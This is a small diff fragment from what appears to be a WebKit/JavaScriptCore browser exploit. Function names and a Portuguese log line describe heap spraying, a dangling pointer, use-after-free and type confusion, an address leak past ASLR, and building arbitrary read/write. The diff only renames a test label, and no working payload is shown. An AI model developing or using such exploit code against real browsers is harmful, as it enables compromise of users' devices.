@@ -370,7 +370,7 @@ async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM) 
 
 
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
-    const FNAME_CURRENT_TEST = "executeTypedArrayVictimAddrofAndWebKitLeak_R43";
+    const FNAME_CURRENT_TEST = "Teste Uaf Type Confusion";
     const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v152_AGRESSIVO"; // Nome mais curto para logs internos
     logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Integração UAF/TC e Construção de ARB R/W Universal ---`, "test");
 
